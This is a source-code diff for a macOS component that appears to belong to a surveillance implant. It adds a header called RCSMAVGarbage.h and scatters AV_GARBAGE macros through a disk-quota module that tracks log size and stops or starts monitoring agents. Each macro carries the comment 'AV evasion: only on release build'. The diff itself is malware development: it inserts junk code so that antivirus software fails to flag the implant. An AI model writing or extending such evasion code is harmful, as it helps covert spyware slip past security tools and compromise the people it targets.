@@ -13,6 +13,8 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
+#import "RCSMAVGarbage.h"
+
 static __m_MDiskQuota *sharedDiskQuota = nil;
 
 typedef struct {
@@ -117,7 +119,10 @@ typedef struct  {
 - (void)calcQuotas
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSDictionary *fsAtt = [[NSFileManager defaultManager] attributesOfFileSystemForPath: @"/" error: nil];
   
   mFreeDisk = [[fsAtt objectForKey: NSFileSystemFreeSize] longLongValue];
@@ -126,9 +131,16 @@ typedef struct  {
   NSArray *folderFiles;
   NSString *path;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   folderFiles = [[NSFileManager defaultManager] subpathsAtPath: [[NSBundle mainBundle] bundlePath]];
   
   NSEnumerator *fileEnum = [folderFiles objectEnumerator];
+  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   while ( path = [fileEnum nextObject]) 
   {
@@ -160,9 +172,15 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if (confDict) 
   {
     quota_conf_entry_t *params = (quota_conf_entry_t*)[[confDict objectForKey: @"data"] bytes];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
     
     mMaxLogQuota = params->disk_quota;
     mStartAction = [anAction copy];
@@ -184,6 +202,9 @@ typedef struct  {
   mMaxLogQuota = 0; 
   mMaxQuotaTriggered = FALSE;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (mStartAction) 
     {
       [mStartAction release];
@@ -201,10 +222,16 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (confData == nil)
     return;
     
   global_conf_t *conf = (global_conf_t*) [confData bytes];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   mMaxGlobalLogSize = conf->max_disk_log;
   mMinGlobalFreeDisk = conf->min_disk_free;
@@ -220,11 +247,17 @@ typedef struct  {
 }
 
 - (void)checkQuotas
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
   NSNumber *stopAllAgents = [[NSNumber alloc] initWithInt:1];
   NSNumber *startAllAgents = [[NSNumber alloc] initWithInt:0];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   while (TRUE) 
     {
@@ -235,6 +268,9 @@ typedef struct  {
             mUsed, mMaxLogQuota, mMaxGlobalLogSize, mMaxQuotaTriggered);
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // check quotas till logs are flushed
       if ([[__m_MTaskManager sharedInstance] mIsSyncing])
           continue;
@@ -242,7 +278,10 @@ typedef struct  {
 #ifdef DEBUG_QUOTA
     infoLog(@"checking... %d", (mMaxLogQuota > 0 && mMaxQuotaTriggered == FALSE &&  mUsed > mMaxLogQuota));
 #endif   
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
        // Check and trigger quota events in an out
       if (mMaxLogQuota > 0 && mMaxQuotaTriggered == FALSE &&  (mUsed > mMaxLogQuota))
         {
@@ -253,7 +292,10 @@ typedef struct  {
         }
       
       sleep(1);
-          
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       if (mMaxLogQuota > 0 && mMaxQuotaTriggered == TRUE && (mUsed < mMaxLogQuota))
         {
 #ifdef DEBUG_QUOTA
@@ -267,7 +309,10 @@ typedef struct  {
       mFreeDisk = [[fsAtt objectForKey: NSFileSystemFreeSize] longLongValue];
 
       sleep(1);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       if (mMaxGlobalQuotaReached == FALSE && 
           ((mFreeDisk < mMinGlobalFreeDisk) || (mUsed > mMaxGlobalLogSize)) )
         {
@@ -280,7 +325,10 @@ typedef struct  {
           infoLog(@"mMaxGlobalQuotaReached exceeded [%lu > %lu]", mUsed, mMaxGlobalLogSize);
 #endif
         }
-       
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       sleep(1);
       
       if (mMaxGlobalQuotaReached == TRUE && 
@@ -297,8 +345,15 @@ typedef struct  {
         }
        
     }
-      
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [stopAllAgents release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [startAllAgents release];
   
   [pool release];
